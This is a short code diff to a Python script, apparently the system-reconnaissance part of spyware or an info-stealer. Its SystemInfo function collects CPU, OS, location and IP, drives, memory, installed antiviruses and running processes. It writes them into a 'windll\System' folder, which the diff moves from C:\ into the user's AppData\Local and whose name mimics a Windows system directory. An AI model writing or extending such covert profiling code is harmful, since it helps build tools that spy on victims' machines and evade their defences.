@@ -33,6 +33,7 @@ logo = '''
 '''
 def SystemInfo():
     try:
+        pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
         def get_size(bytes, suffix="B"):
             factor = 1024
             for unit in ["", "K", "M", "G", "T", "P"]:
@@ -127,7 +128,7 @@ def SystemInfo():
             print(e)
         try:
             all_data = "Time: " + time.asctime() + '\n' + "CPU: " + platform.processor() + '\n' + "OS type: " + platform.system() + ' ' + platform.release() + '\nLocation and IP:' + location1 + '\nDrives:' + drives + str(namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem )+ str(allstorage) + str(usedstorage) + str(freestorage)
-            file = open(r'C:\windll\System\PC_info.txt', "w+", encoding='utf-8') 
+            file = open(rf'{pathtofolder}\windll\System\PC_info.txt', "w+", encoding='utf-8') 
             file.write(logo)
             file.write(all_data)
             file.write('\nAntiviruses: '+str(Antiviruses))
@@ -139,7 +140,7 @@ def SystemInfo():
             pass
 
         file.close()
-        fileproc = open(r'C:\windll\System\Processes.txt', 'a', encoding='utf-8')
+        fileproc = open(rf'{pathtofolder}\windll\System\Processes.txt', 'a', encoding='utf-8')
         result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
         fileproc.write("\n".join(process for process in result))
         fileproc.close()
